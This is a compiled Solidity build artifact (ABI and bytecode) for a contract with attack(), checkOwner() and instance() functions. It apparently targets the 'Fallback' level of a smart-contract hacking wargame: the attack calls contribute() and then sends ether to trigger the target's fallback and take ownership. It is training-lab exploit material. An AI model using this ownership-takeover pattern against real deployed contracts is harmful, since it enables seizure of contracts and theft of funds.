{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"checkOwner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IFallback"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161032d38038061032d833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6102a7806100865f395ff3fe608060405260043610610036575f3560e01c8063022ec0951461009d5780639e5faafc146100d7578063cdbce03d146100df575f5ffd5b36610099575f80546040516001600160a01b039091169034908381818185875af1925050503d805f8114610085576040519150601f19603f3d011682016040523d82523d5f602084013e61008a565b606091505b5050905080610097575f5ffd5b005b5f5ffd5b3480156100a8575f5ffd5b505f546100bb906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6100976100f3565b3480156100ea575f5ffd5b506100bb6101cb565b5f8054604080517fd7bb99ba00000000000000000000000000000000000000000000000000000000815290516001600160a01b039092169263d7bb99ba92655af3107a400092600480820193929182900301818588803b158015610155575f5ffd5b505af1158015610167573d5f5f3e3d5ffd5b50505f80546040519194506001600160a01b031692503491508381818185875af1925050503d805f81146101b6576040519150601f19603f3d011682016040523d82523d5f602084013e6101bb565b606091505b50509050806101c8575f5ffd5b50565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b0316638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561021b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061023f9190610244565b905090565b5f60208284031215610254575f5ffd5b81516001600160a01b038116811461026a575f5ffd5b939250505056fea26469706673582212207bd108a0ac570d24f8bf3b3736d40e4c66ec6651f5519a1f857efc97095356f264736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","checkOwner()":"cdbce03d","instance()":"022ec095"},"id":0}